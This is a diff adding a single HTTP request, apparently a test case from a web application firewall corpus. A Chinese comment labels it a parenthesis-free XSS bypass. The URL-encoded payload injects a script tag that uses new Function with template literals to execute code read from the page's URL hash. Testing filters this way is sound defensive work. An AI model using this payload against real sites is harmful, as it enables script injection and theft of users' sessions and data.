@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_标签属性_关键字替换类(无括号绕过)-06506692
+# 该xss攻击语句中的字符串表示了一个函数名，所以最终它会创建一个名为 X 的 Function 对象，然后执行该函数。
+GET /?id=%3Cscript%3Enew%20Function%60X$%7Bdocument.location.hash.substr%601%60%7D%60%3C%2Fscript%3E&bid=hd_tag_m8mv25pu HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25pu
+RM-PRO-Token: c1ff0a4efd97c7f409dcb093e3063ee9
+RM-PRO-Time: 1742808499606
+User-Agent: curl/7.83.1
+
